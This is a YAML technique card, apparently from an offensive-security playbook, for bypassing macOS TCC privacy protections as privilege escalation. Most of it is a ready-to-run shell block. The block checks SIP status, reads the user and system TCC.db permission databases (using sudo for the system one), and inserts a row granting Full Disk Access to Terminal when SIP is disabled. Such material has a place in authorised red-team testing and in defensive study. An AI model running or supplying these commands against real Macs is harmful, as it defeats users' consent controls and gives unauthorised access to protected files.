---
description: |
  Bypass macOS Transparency, Consent, and Control (TCC) protections by querying or modifying the TCC database, abusing FDA apps, and exploiting SIP status.
commands:
  - have: Shell
    cmd: |
      # Check SIP status
      csrutil status

      # Query TCC databases
      sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT service, client FROM access;"
      sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;"

      # Modify TCC.db (only if SIP disabled) — grant FDA to Terminal
      sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT INTO access VALUES('kTCCServiceSystemPolicyAllFiles','com.apple.Terminal',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,0)"
phase:
  - PrivEsc
target_os:
  - macOS
services: []
techniques:
  - TCC_Bypass
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc
---
